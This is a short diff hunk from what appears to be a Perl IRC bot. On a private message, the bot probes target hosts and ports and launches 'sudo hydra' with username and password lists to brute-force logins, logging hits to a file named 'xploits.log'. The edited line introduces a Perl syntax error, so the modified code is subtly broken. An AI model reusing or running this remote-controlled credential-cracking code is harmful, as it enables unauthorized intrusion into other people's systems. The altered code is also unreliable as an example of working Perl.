@@ -130,7 +130,7 @@ $irc->on(irc_privmsg => sub {
     foreach my $porti (@hydra_PORTS)
     {
       if (my $sock = IO::Socket::INET->new(PeerAddr => $row, PeerPort => $porti->[0], Proto => 'tcp')) {
-        printa("Cracking $porti $row");
+        printa("Cracking " $porti $row);
         my @cmdhydra = ("sudo hydra -F -L /user -P /pass $row " . lc($porti->[1]) . " -s " . $porti->[0] . " -v -t 4 -W3 >>xploits.log");     
         close($sock);
         system(@cmdhydra);
